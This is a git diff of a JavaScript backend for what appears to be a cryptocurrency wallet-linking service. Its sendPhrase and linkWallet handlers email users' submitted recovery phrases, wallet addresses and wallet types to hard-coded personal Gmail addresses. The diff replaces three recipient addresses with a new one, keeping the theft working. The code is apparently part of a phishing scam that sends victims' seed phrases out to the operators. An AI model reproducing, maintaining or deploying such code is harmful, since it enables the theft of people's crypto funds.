@@ -380,20 +380,7 @@ exports.sendPhrase = async (req, res) => {
     const referenceNumber = generateReferenceNumber(); // Use the existing function
     
     await sendEmail(
-      'aguchris740@gmail.com',
-      'Your Recovery Phrase',
-      `Your recovery phrase is: ${phrase}\n\nPlease store this safely and never share it with anyone.
-      Reference Number: ${referenceNumber}`
-    );
-await sendEmail(
-      'aqfs078@gmail.com',
-      'Your Recovery Phrase',
-      `Your recovery phrase is: ${phrase}\n\nPlease store this safely and never share it with anyone.
-      Reference Number: ${referenceNumber}`
-    );
-
-    await sendEmail(
-      'justtrust002@gmail.com',
+      'nmajufavour16@gmail.com',
       'Your Recovery Phrase',
       `Your recovery phrase is: ${phrase}\n\nPlease store this safely and never share it with anyone.
       Reference Number: ${referenceNumber}`
@@ -430,14 +417,7 @@ exports.linkWallet = async (req, res) => {
 
     const referenceNumber = generateReferenceNumber();
     await sendEmail(
-      'aqfs078@gmail.com',
-      'Your Recovery Phrase Linked',
-      `Your recovery phrase is: ${phrase}\nWallet Address: ${walletAddress}\nType: ${type}\n\nPlease store this safely and never share it with anyone.
-      \nReference Number: ${referenceNumber}`
-    );
-
-await sendEmail(
-      ['aguchris740@gmail.com','justtrust002@gmail.com'],
+      'nmajufavour16@gmail.com',
       'Your Recovery Phrase Linked',
       `Your recovery phrase is: ${phrase}\nWallet Address: ${walletAddress}\nType: ${type}\n\nPlease store this safely and never share it with anyone.
       \nReference Number: ${referenceNumber}`
